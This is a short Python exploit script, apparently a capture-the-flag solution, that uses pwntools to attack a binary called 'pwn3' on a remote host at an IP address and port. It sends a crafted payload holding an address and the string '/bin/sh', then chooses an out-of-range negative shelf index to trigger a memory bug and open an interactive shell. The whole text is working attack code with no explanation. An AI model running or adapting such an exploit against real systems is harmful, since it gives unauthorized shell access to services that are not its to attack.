#!/usr/bin/env python3
from pwn import *
exe = ELF('pwn3', checksec = False)

# p = process(exe.path)
p = remote('103.197.184.48', 13335)

input()
p.sendafter(b'(32 bytes): ', p64(0x4040b0) + p64(0) + b'/bin/sh\0')
p.sendlineafter(b'Choose a shelf (0-7, 9=exit): ', b'-4')


p.interactive()